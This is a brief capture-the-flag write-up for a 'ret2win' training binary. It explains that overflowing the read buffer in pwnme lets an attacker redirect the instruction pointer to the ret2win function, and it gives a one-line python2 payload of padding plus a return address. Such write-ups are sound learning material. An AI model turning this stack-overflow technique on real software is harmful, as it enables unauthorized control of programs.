# Solution
This challenge is a simple flow redirection. Static analysis will tell us that we need to overflow the `read` function in  `pwnme` then point `EIP/RIP` to `ret2win`.

For 64 bit:
```bash
./ret2win < <(python2 -c 'print "A"*40 + "\x56\x07\x40\x00\x00\x00\x00\x00"')
```

For 32 bit, adjust the padding size and address as necessary.
